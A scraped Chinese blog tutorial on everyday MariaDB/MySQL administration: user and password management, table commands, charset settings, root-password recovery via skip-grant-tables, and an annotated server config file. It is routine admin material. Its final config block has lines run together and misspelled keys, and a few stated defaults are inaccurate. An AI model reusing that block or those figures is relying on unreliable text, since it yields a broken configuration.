<p>5、输入sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf  ,修改mysql配置文件。</p>
<p>将bind-address修改127.0.0.1为0.0.0.0。</p>
<p>最后，重新输入账号密码就可以了。参考链接</p>
<h1 id="Mariadb-Mysql命令行常用命令"><a href="#Mariadb-Mysql命令行常用命令" class="headerlink" title="Mariadb/Mysql命令行常用命令"></a>Mariadb/Mysql命令行常用命令</h1><p><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/reprint.png" alt="img"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30708329">weixin_30708329</a><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCurrentTime2.png" alt="img">于 2019-05-21 17:58:00 发布<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes2.png" alt="img">146</p>
<h2 id="一、初始化等"><a href="#一、初始化等" class="headerlink" title="一、初始化等"></a>一、初始化等</h2><h3 id="1、登陆数据库方法"><a href="#1、登陆数据库方法" class="headerlink" title="1、登陆数据库方法"></a><strong>1、登陆数据库方法</strong></h3><p>　　　  mysql -u 用户名 -p 用户密码</p>
<h3 id="2、修改root及用户密码"><a href="#2、修改root及用户密码" class="headerlink" title="2、修改root及用户密码"></a>2、修改root及用户密码</h3><p>　　　　use mysql;</p>
<p>　　　　update user set password=password(‘11111111’) where user=’root’ and host=’localhost’;</p>
<p>　　　　flush privileges;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [mysql]&gt; update user set password=password(&#x27;11111111&#x27;) where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">MariaDB [mysql]&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mysql]&gt; exit</span><br></pre></td></tr></table></figure>

<h3 id="3、创建用户"><a href="#3、创建用户" class="headerlink" title="3、创建用户"></a><strong>3、创建用户</strong></h3><p>　　　　insert into mysql.user(host,user,password)values(“localhost”,”test”,password(“password”));</p>
<p>　　　　flush privileges;</p>
<h3 id="4、删除用户"><a href="#4、删除用户" class="headerlink" title="4、删除用户"></a>4、删除用户</h3><p>　　　　DELETE FROM user WHERE User=”test” and Host=”localhost”;<br>　　　　flush privileges;　　</p>
<h3 id="5、删除用户的数据库"><a href="#5、删除用户的数据库" class="headerlink" title="5、删除用户的数据库"></a>5、删除用户的数据库</h3><p>　　　　drop database test1;</p>
<h3 id="6、交互模式初始化"><a href="#6、交互模式初始化" class="headerlink" title="6、交互模式初始化"></a>6、交互模式初始化</h3><p>　　　　mysql_secure_installation</p>
<h2 id="二、-常用操作"><a href="#二、-常用操作" class="headerlink" title="二、 常用操作"></a>二、 常用操作</h2><h3 id="1、显示数据库列表"><a href="#1、显示数据库列表" class="headerlink" title="1、显示数据库列表"></a><strong>1、显示数据库列表</strong></h3><p>　　　　show databases:查看所有的数据库</p>
<h3 id="2、创建数据库"><a href="#2、创建数据库" class="headerlink" title="2、创建数据库"></a>2、创建数据库</h3><p>　　　　create database zxg：创建名尾zxg的数据库</p>
<h3 id="3、进入数据库"><a href="#3、进入数据库" class="headerlink" title="3、进入数据库"></a>3、进入数据库</h3><p>　　　　use zxg:进入zxg的数据库</p>
<h3 id="4、显示库中的数据表"><a href="#4、显示库中的数据表" class="headerlink" title="4、显示库中的数据表"></a>4、显示库中的数据表</h3><p>　　　　show tables：查看数据库里有多少张表</p>
<h3 id="5、创建数据表"><a href="#5、创建数据表" class="headerlink" title="5、创建数据表"></a>5、创建数据表</h3><p>　　　　create table t1 (id varchar(20),name varchar(20)):创建名为t1表，并创建两两个字段，id、name，varchar表示设置数据长度，用字符来定义长度单位，其</p>
<h3 id="6、插入数据"><a href="#6、插入数据" class="headerlink" title="6、插入数据"></a>6、插入数据</h3><p>　　　　insert into t1 values（”1”，”zxg”）:向表中插入数据</p>
<h3 id="7、查看数据表"><a href="#7、查看数据表" class="headerlink" title="7、查看数据表"></a>7、查看数据表</h3><p>　　　　select * from t1 ：查看t1表数据内容</p>
<h3 id="8、多条件查询"><a href="#8、多条件查询" class="headerlink" title="8、多条件查询"></a>8、多条件查询</h3><p>　　　　select * from t1 where id=1 and age = ‘zxg ‘ : id、age 多个条件查询</p>
<h3 id="9、查看字段内容"><a href="#9、查看字段内容" class="headerlink" title="9、查看字段内容"></a>9、查看字段内容</h3><p>　　　　desc t1:查看t1 表字段内容</p>
<h3 id="10、修改字段长度"><a href="#10、修改字段长度" class="headerlink" title="10、修改字段长度"></a>10、修改字段长度</h3><p>　　　　alter table t1 modify column name varchar(20):修改name字段的长度</p>
<h3 id="11、修改该字段内容"><a href="#11、修改该字段内容" class="headerlink" title="11、修改该字段内容"></a>11、修改该字段内容</h3><p>　　　　update t1 set name=’zxg.net’ where id=1：修改name字段的内容</p>
<h3 id="12、权限刷新"><a href="#12、权限刷新" class="headerlink" title="12、权限刷新"></a><strong>12、权限刷新</strong></h3><p>　　　　flush privileges :刷新权限</p>
<h3 id="13、清空表单"><a href="#13、清空表单" class="headerlink" title="13、清空表单"></a>13、清空表单</h3><p>　　　　delete from t1 :清空表内容</p>
<h3 id="14、删除数据表"><a href="#14、删除数据表" class="headerlink" title="14、删除数据表"></a>14、删除数据表</h3><p>　　　　drop table t1:删除表</p>
<h3 id="15、删除数据库"><a href="#15、删除数据库" class="headerlink" title="15、删除数据库"></a>15、删除数据库</h3><p>　　　　drop database zxg：删除zxg数据库</p>
<h3 id="16、查看数据库字符集"><a href="#16、查看数据库字符集" class="headerlink" title="16、查看数据库字符集"></a>16、查看数据库字符集</h3><p>　　　　show variables like ‘%char%’:查看数据库字符集</p>
<h3 id="17、查看存储引擎"><a href="#17、查看存储引擎" class="headerlink" title="17、查看存储引擎"></a>17、查看存储引擎</h3><p>　　　　show engines:查看MySQL存储引擎。</p>
<h3 id="18、查看默认存储引擎"><a href="#18、查看默认存储引擎" class="headerlink" title="18、查看默认存储引擎"></a>18、查看默认存储引擎</h3><p>　　　　show variables like ‘%storage_engine%’:查看MySQL默认的存储引擎</p>
<h3 id="19、修改存储引擎"><a href="#19、修改存储引擎" class="headerlink" title="19、修改存储引擎"></a>19、修改存储引擎</h3><p>　　　　alter table t1 engine=innodb:修改MySQL t1表存储引擎</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> 1 [root@web2 ~]# mysql</span><br><span class="line"> 2 Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line"> 3 Your MariaDB connection id is 2</span><br><span class="line"> 4 Server version: 5.5.60-MariaDB MariaDB Server</span><br><span class="line"> 5 </span><br><span class="line"> 6 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"> 7 </span><br><span class="line"> 8 Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"> 9 </span><br><span class="line">10 MariaDB [(none)]&gt; show databases;</span><br><span class="line">11 +--------------------+</span><br><span class="line">12 | Database           |</span><br><span class="line">13 +--------------------+</span><br><span class="line">14 | information_schema |</span><br><span class="line">15 | mysql              |</span><br><span class="line">16 | performance_schema |</span><br><span class="line">17 | test               |</span><br><span class="line">18 +--------------------+</span><br><span class="line">19 4 rows in set (0.00 sec)</span><br><span class="line">20 </span><br><span class="line">21 MariaDB [(none)]&gt;  create database zxg;                   </span><br><span class="line">22 Query OK, 1 row affected (0.00 sec)</span><br><span class="line">23 </span><br><span class="line">24 MariaDB [(none)]&gt; use zxg;</span><br><span class="line">25 Database changed</span><br><span class="line">26 MariaDB [zxg]&gt; show tables;</span><br><span class="line">27 Empty set (0.00 sec)</span><br><span class="line">28 </span><br><span class="line">29 MariaDB [zxg]&gt; create table t1(id varchar(20),name varchar(20));</span><br><span class="line">30 Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">31 </span><br><span class="line">32 MariaDB [zxg]&gt; show tables;</span><br><span class="line">33 +---------------+</span><br><span class="line">34 | Tables_in_zxg |</span><br><span class="line">35 +---------------+</span><br><span class="line">36 | t1            |</span><br><span class="line">37 +---------------+</span><br><span class="line">38 1 row in set (0.00 sec)</span><br><span class="line">39 </span><br><span class="line">40 MariaDB [zxg]&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> 1 MariaDB [zxg]&gt; insert into t1 values (&quot;1&quot;,&quot;zxg&quot;);</span><br><span class="line"> 2 Query OK, 1 row affected (0.01 sec)</span><br><span class="line"> 3 </span><br><span class="line"> 4 MariaDB [zxg]&gt; select *from t1;</span><br><span class="line"> 5 +------+------+</span><br><span class="line"> 6 | id | name |</span><br><span class="line"> 7 +------+------+</span><br><span class="line"> 8 | 1 | zxg |</span><br><span class="line"> 9 +------+------+</span><br><span class="line">10 1 row in set (0.00 sec)</span><br><span class="line">11 </span><br><span class="line">12 MariaDB [zxg]&gt; select *from t1 where id=1; </span><br><span class="line">13 +------+------+</span><br><span class="line">14 | id | name |</span><br><span class="line">15 +------+------+</span><br><span class="line">16 | 1 | zxg |</span><br><span class="line">17 +------+------+</span><br><span class="line">18 1 row in set (0.00 sec)</span><br><span class="line">19 </span><br><span class="line">20 MariaDB [zxg]&gt; select *from t1 where id=1 and name=&#x27;zxg&#x27;;</span><br><span class="line">21 +------+------+</span><br><span class="line">22 | id | name |</span><br><span class="line">23 +------+------+</span><br><span class="line">24 | 1 | zxg |</span><br><span class="line">25 +------+------+</span><br><span class="line">26 1 row in set (0.01 sec)</span><br><span class="line">27 </span><br><span class="line">28 MariaDB [zxg]&gt; desc t1;</span><br><span class="line">29 +-------+-------------+------+-----+---------+-------+</span><br><span class="line">30 | Field | Type | Null | Key | Default | Extra |</span><br><span class="line">31 +-------+-------------+------+-----+---------+-------+</span><br><span class="line">32 | id | varchar(20) | YES | | NULL | |</span><br><span class="line">33 | name | varchar(20) | YES | | NULL | |</span><br><span class="line">34 +-------+-------------+------+-----+---------+-------+</span><br><span class="line">35 2 rows in set (0.00 sec)</span><br><span class="line">36 </span><br><span class="line">37 MariaDB [zxg]&gt; alter table t1 modify column name varchar(20);</span><br><span class="line">38 Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">39 Records: 0 Duplicates: 0 Warnings: 0</span><br><span class="line">40 </span><br><span class="line">41 MariaDB [zxg]&gt; update t1 set name=&#x27;zxg.net&#x27; where id=1;</span><br><span class="line">42 Query OK, 1 row affected (0.00 sec)</span><br><span class="line">43 Rows matched: 1 Changed: 1 Warnings: 0</span><br><span class="line">44 </span><br><span class="line">45 MariaDB [zxg]&gt;</span><br></pre></td></tr></table></figure>

<h2 id="三、mysql-数据库字符集设置"><a href="#三、mysql-数据库字符集设置" class="headerlink" title="三、mysql 数据库字符集设置"></a>三、mysql 数据库字符集设置</h2><p> 　mysql数据库存储数据时，默认编码为latinl，存储中文字符时，在调用时会显示为乱码，为了解决该乱码问题，需修改该mysql默认字符集为UTE-8　　</p>
<p>　　 装mariadb的是时候看已经默认为ute-8</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show variables like &#x27;%char%&#x27;;</span><br><span class="line">+--------------------------+----------------------------+</span><br><span class="line">| Variable_name            | Value                      |</span><br><span class="line">+--------------------------+----------------------------+</span><br><span class="line">| character_set_client     | utf8                       |</span><br><span class="line">| character_set_connection | utf8                       |</span><br><span class="line">| character_set_database   | latin1                     |</span><br><span class="line">| character_set_filesystem | binary                     |</span><br><span class="line">| character_set_results    | utf8                       |</span><br><span class="line">| character_set_server     | latin1                     |</span><br><span class="line">| character_set_system     | utf8                       |</span><br><span class="line">| character_sets_dir       | /usr/share/mysql/charsets/ |</span><br><span class="line">+--------------------------+----------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>　　　　如不是，可以设置</p>
<p>　　　　SET character_set_client = utf8;</p>
<p>　　　　SET character_set_results = utf8;</p>
<p>　　　　SET character_set_connection = utf8;</p>
<h2 id="四、mysql-数据库密码管理"><a href="#四、mysql-数据库密码管理" class="headerlink" title="四、mysql 数据库密码管理"></a>四、mysql 数据库密码管理</h2><p>　　设置密码访问，密码破解、密码权限、修改密码；</p>
<h3 id="1、创建用户及授权"><a href="#1、创建用户及授权" class="headerlink" title="1、创建用户及授权"></a>1、创建用户及授权</h3><p>　　　　grant all on zxg.* to test@localhost identified by ‘pas’;</p>
<p>　　　　grant select,insert,update,delete on *.*to test@”%” identified by ‘pas’;</p>
<p>　　　　grant all on zxg.* to test@<code>192.168.216.53</code> identified by ‘pas’</p>
<h3 id="2、破解密码方法"><a href="#2、破解密码方法" class="headerlink" title="2、破解密码方法"></a>2、破解密码方法</h3><p>　　　　停止服务—》跳过权限方式启动—》单开一个窗口登陆—》登陆修改密码即可</p>
<p>　　　　1）systemctl stop mariadb</p>
<p>　　　　2）mysqld_safe –skip-grant-tables &amp;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@web2 ~]# mysqld_safe --skip-grant-tables &amp;</span><br><span class="line">[1] 47542</span><br><span class="line">[root@web2 ~]# 190520 15:45:22 mysqld_safe Logging to &#x27;/var/log/mariadb/mariadb.log&#x27;.</span><br><span class="line">190520 15:45:22 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">[root@web2 ~]# mysql</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 1</span><br><span class="line">Server version: 5.5.60-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [mysql]&gt; update user set password=password(&#x27;11111111&#x27;) where user=&#x27;root&#x27; ;</span><br><span class="line">Query OK, 3 rows affected (0.01 sec)</span><br><span class="line">Rows matched: 4  Changed: 3  Warnings: 0</span><br><span class="line"></span><br><span class="line">MariaDB [mysql]&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mysql]&gt; exit</span><br><span class="line">Bye</span><br><span class="line">[root@web2 ~]# </span><br></pre></td></tr></table></figure>

<p>然后退出”跳过权限方式“ ctrl+c ，正常启动mysql就可以了</p>
<h2 id="五、mysql-配置文件详解"><a href="#五、mysql-配置文件详解" class="headerlink" title="五、mysql 配置文件详解"></a>五、mysql 配置文件详解</h2><h3 id="1、参数说明"><a href="#1、参数说明" class="headerlink" title="1、参数说明"></a>1、参数说明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]                                                              #服务端配置</span><br><span class="line">port        = 3306                                                    #监听端口</span><br><span class="line">socket      = /tmp/mysql.sock                                         #通信设置</span><br><span class="line">user    = mariadb                                                     #使用mariadb用户启动</span><br><span class="line">basedir = /usr/local/mariadb                                          #安装路径</span><br><span class="line">datadir = /data/mysql                                                 #数据目录</span><br><span class="line">log_error = /data/mysql/mariadb.err                             　　　 #错误日志</span><br><span class="line">pid-file = /data/mysql/mariadb.pid                             　　　　#pid进程文件</span><br><span class="line">skip-external-locking                                                 #避免mysql的外部锁定，减少出错几率提高稳定性</span><br><span class="line">key_buffer_size = 64M                                                 #缓存存储引擎参数，这个参数可以设置为64M</span><br><span class="line">max_allowed_packet = 1M                                               #允许最大接收数据包的大小，防止服务器发送过大的数据包，可以设置为16MB或者更大，但设置太大也可能有危险</span><br><span class="line">table_open_cache = 256                                                #mysql每打开一个表，都会读入一些数据到table_open_cache缓存中，当MYSQL在这个缓存中找不到相应的信息时，才会去磁盘读取，默认值64，假设系统有200个并发连接，则需将此参数设置为200*N（N为每个连接所需的文件描述符数目）；当设置为很大时，如果系统处理不了那么多文件描述符，那么就会出现客户端失效，连接不上</span><br><span class="line">sort_buffer_size = 1M                                                 #在表进行order by和group by 排序操作时，由于排序的字段没有索引，会出现Using filesort，为了提高性能，可用此参数增加每个线程分配的缓存区大小，默认时256k，这个参数不要设置过大，一般128~256k，另外一般出现using filesort的时候，要通过增加索引来解决</span><br><span class="line">net_buffer_length = 8K                                                #包消息缓冲区初始化net_buffer_length字节，但需要时可以增长到max_allowed_packet字节</span><br><span class="line">read_buffer_size = 1M                                                 #该参数用于表的顺序扫描，表示每个线程分配的缓冲区大小，比如在进行全表扫描时，mysql会按照数据的存储顺序一次读取数据块，每次读取的数据块首先会暂存在read_buffer_size中，当buffer空间被写满或者全部数据读取结束后，在将buffer中的数据返回给上层调用者，以提高效率默认128k，也不要设置过大</span><br><span class="line">read_rnd_buffer_size = 512K                                           #该参数用于表的随机读取，表示每个线程分配的缓冲区大小，比如，按照一个非索引字段做order by排序操作时，就会利用这个缓冲区来暂存读取的数据，默认时256k，也不要设置过大</span><br><span class="line">myisam_sort_buffer_size = 16M                                         #当myisam表执行repair table或创建索引时，用以缓冲排序索引，设置太小可能会遇到&quot;myisam_sort_buffer_size is to small&quot;</span><br><span class="line">thread_cache_size = 32                                                #线程池，线程缓冲。用来缓冲空闲的线程，以至于不被销毁，如果线程缓冲在的空闲线程，需要重新建立新连接，则会优先调用线程池中的缓冲，很快就能相应连接请求，每建立一个连接，都需要一个线程与之匹配。</span><br><span class="line">query_cache_size = 32M                                                #缓存select语句和结果集大小的参数。查询缓存会存储一个select查询的文本与被传送到客户端的相应结果。如果之后接收到一个相同的查询，服务器会从查询缓存中检索结果，而不是再次分析和执行这个同样的查询。如果你的环境中写操作很少，读操作频繁，那么打开query_cache_type=1，会对性能有明显提升。如果写操作频繁，则应该关闭它（query_cache_type=0）。</span><br><span class="line">tmp_table_size = 64M                                                  #临时HEAP数据表的最大长度(默认设置是32M); 超过这个长度的临时数据表将被转换为MyISAM数据表并存入一个临时文件。</span><br><span class="line">                                                                      #</span><br><span class="line">explicit_defaults_for_timestamp = true                     　　　　　　 #是否显示默认时间戳</span><br><span class="line">#skip-networking                                                      #</span><br><span class="line">max_connections = 500                                                 #该参数用来设置最大连接数，告诉你当前你的服务器允许多少并发连接。默认为100，一般设置为512-1000即可。请记住，太多的连接会导致内存的使用量过高并且会锁住你的 MySQL 服务器。一般小网站需要 100-200 的连接数，而较大可能需要 500-800 甚至更多。这里的值很大程度上取决于你 MySQL/MariaDB 的使用情况。</span><br><span class="line">max_connect_errors = 100                                              #如果有时网络抽风，或者应用配置错误，或者其他原因导致客户端短时间内不断的尝试连接，客户端可能会被列入黑名单，然后将无法连接，直到再次刷新主机缓存。这个选项默认值太小了，可以考虑设的足够大（如果你的服务器配置够强大的话）。</span><br><span class="line">open_files_limit = 65535                                              #mysql打开最大文件数</span><br><span class="line">                                                                      #</span><br><span class="line">log-bin=mysql-bin                                                     #这些路径相对于datadir</span><br><span class="line">binlog_format=mixed                                                   #日志格式</span><br><span class="line">server-id   = 1                                                       #给服务器分配一个独一无二的ID编号; n的取值范围是1~2的32次方启用二进制日志功能。在复制数据同步的时候会用到，Helloweba后面会有文章介绍。</span><br><span class="line">expire_logs_days = 10                                                 #启用二进制日志后，保留日志的天数。服务器会自动清理指定天数前的日志文件，如果不设置则会导致服务器空间耗尽。一般设置为7～14天。</span><br><span class="line">                                                                       #</span><br><span class="line">default_storage_engine = InnoDB                                     　#新数据表的默认存储引擎(默认设置是MyISAM)。这项设置还可以通过–default-table-type选项来设置。</span><br><span class="line">innodb_file_per_table = 1                                             #提供了更灵活的方式，它把每个数据库的信息保存在一个 .ibd 数据文件中。每个 .idb 文件代表它自己的表空间。通过这样的方式可以更快地完成类似 “TRUNCATE” 的数据库操作，当删除或截断一个数据库表时，你也可以回收未使用的空间。这样配置的另一个好处是你可以将某些数据库表放在一个单独的存储设备。这可以大大提升你磁盘的 I/O 负载。</span><br><span class="line">innodb_data_home_dir = /data/mysql                             　　　　#InnoDB主目录，所有与InnoDB数据表有关的目录或文件路径都相对于这个路径。在默认的情况下，这个主目录就是MySQL的数据目录。</span><br><span class="line">innodb_data_file_path = ibdata1:10M:autoextend     　　　　　　　　　　　#用来容纳InnoDB为数据表的表空间: 可能涉及一个以上的文件; 每一个表空间文件的最大长度都必须以字节(B)、兆字节(MB)或千兆字节(GB)为单位给出; 表空间文件的名字必须以分号隔开; 最后一个表空间文件还可以带一个autoextend属性和一个最大长度(max:n)。</span><br><span class="line">innodb_log_group_home_dir = /data/mysql                     　　　　　　#用来存放InnoDB日志文件的目录路径(如ib_logfile0、ib_logfile1等)。在默认的情况下，InnoDB驱动程序将使用 MySQL数据目录作为自己保存日志文件的位置。</span><br><span class="line">innodb_buffer_pool_size = 256M                                     　　#这个参数是InnoDB存储引擎的核心参数，默认为128KB，这个参数要设置为物理内存的60%～70%。</span><br><span class="line">innodb_log_file_size = 64M                                            #事务日志文件写操作缓存区的最大长度(默认设置是1MB)。</span><br><span class="line">innodb_log_buffer_size = 8M                                           #事务日志所使用的缓存区。InnoDB在写事务日志的时候，为了提高性能，先将信息写入Innodb Log Buffer中，当满足innodb_flush_log_trx_commit参数所设置的相应条件（或者日志缓冲区写满）时，再将日志写到文件（或者同步到磁盘）中。可以通过innodb_log_buffer_size参数设置其可以使用的最大内存空间。默认是8MB，一般为16～64MB即可。</span><br><span class="line">innodb_flush_log_at_trx_commit = 1                             　　　　#这个选项决定着什么时候把日志信息写入日志文件以及什么时候把这些文件物理地写(术语称为”同步”)到硬盘上。设置值0的意思是每隔一秒写一次日 志并进行 同步，这可以减少硬盘写操作次数，但可能造成数据丢失; 设置值1(设置设置)的意思是在每执行完一条COMMIT命令就写一次日志并进行同步，这可以防止数据丢失，但硬盘写操作可能会很频繁; 设置值2是一般折衷的办法，即每执行完一条COMMIT命令写一次日志，每隔一秒进行一次同步。</span><br><span class="line">innodb_lock_wait_timeout = 50                                         #如果某个事务在等待n秒(s)后还没有获得所需要的资源，就使用ROLLBACK命令放弃这个事务。这项设置对于发现和处理未能被InnoDB数据表驱动 程序识别出来的死锁条件有着重要的意义。这个选项的默认设置是50s。</span><br><span class="line">                                                                      #</span><br><span class="line">[mysqldump]                                                           #</span><br><span class="line">quick                                                                 #</span><br><span class="line">max_allowed_packet = 16M                                              #            </span><br><span class="line">                                                                      #</span><br><span class="line">[mysql]                                                               #</span><br><span class="line">no-auto-rehash                                                        #</span><br><span class="line">                                                                      #</span><br><span class="line">[myisamchk]                                                           #</span><br><span class="line">key_buffer_size = 64M                                                 #    </span><br><span class="line">sort_buffer_size = 1M                                                 #    </span><br><span class="line">read_buffer = 2M                                                      #</span><br><span class="line">write_buffer = 2M                                                     #</span><br><span class="line">                                                                      #</span><br><span class="line">[mysqlhotcopy]                                                        #</span><br><span class="line">interactive-timeout                                                   #</span><br><span class="line">                                                </span><br></pre></td></tr></table></figure>

<h3 id="2、mysql数据库索引案例（百万量级）"><a href="#2、mysql数据库索引案例（百万量级）" class="headerlink" title="2、mysql数据库索引案例（百万量级）"></a>2、mysql数据库索引案例（百万量级）</h3><p> [client]                     </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">port    =3306                                    </span><br><span class="line">socket    =/tmp/mysql.sock                       </span><br><span class="line">                                                </span><br><span class="line">[mysqld]                                                                               </span><br><span class="line">port        = 3306                                                           </span><br><span class="line">socket      = /tmp/mysql.sock                                     </span><br><span class="line">user    = mysql    server_id　　= 10datadir　　= /data/mysql/old_passwords　　= 1lower_case_table_names　　= 1character-set-server　　= utf8default-storage-engine　　= MYISAMlog-bin　　= bin.loglog-error　　= error.logpid-file　　= mysql.pidlong_query_time　　= 2slow_query_time　　= 2slow_query_log　slow_query_log_file　　= slow.logbinlog_cache_size　　= 4MBbinlog_format　　= mixedmax_binlog_cache_size　　= 16MBmax_binlog_size　　= 1GBexpire_logs_days　　= 30ft_min_word_len　　= 4back_log　　= 512max_allowed_packet　　= 64MBmax_connections　　= 4096max_connect_errors　　= 100join_buffer_size　　= 2MBread_buffer_size　　= 2MBread_rnd_buffer_size　　= 2MBsort_buffer_size　　　　= 2MBquery_cache_size　　= 2MBtable_open_cache　　= 10000thread_cache_size　　= 256max_heap_table_size　　= 64MBtmp_table_size　　= 64MBthread_stack　　= 192KBthread_concurrency　　= 24 local-infile　　= 0skip-show-databaseskip-name-resolveskip-external-lockingconnect_timeout　　= 600interactive_timeout　　= 600wait_timeout　　= 600#MyISAMkey_buffer_size　　= 512MBbulk_insert_buffer_size　　= 64MBmysiam_sort_buffer_size　　= 64MBmysiam_max_sort_file_size　　= 1GBmysiam_repair_threads　　= 1concurrent_insert　　= 2myisam_recover#INNODBinnodb_buffer_pool_size　　= 